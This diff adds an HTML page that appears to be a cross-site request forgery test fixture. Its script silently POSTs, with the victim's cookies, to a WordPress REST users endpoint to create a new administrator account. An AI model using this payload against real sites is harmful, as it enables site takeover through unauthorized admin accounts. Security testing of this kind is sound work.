@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><title>Other site: background fetch</title><script src="common.js"></script></head>
+<body>
+<!-- Background no-cors fetch with cookies: the page cannot read the answer, only cause the effect -->
+<script>
+  fetch(target + '/?rest_route=/wp/v2/users', {
+    method: 'POST',
+    mode: 'no-cors',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: new URLSearchParams(newAdmin).toString(),
+  });
+</script>
+</body></html>
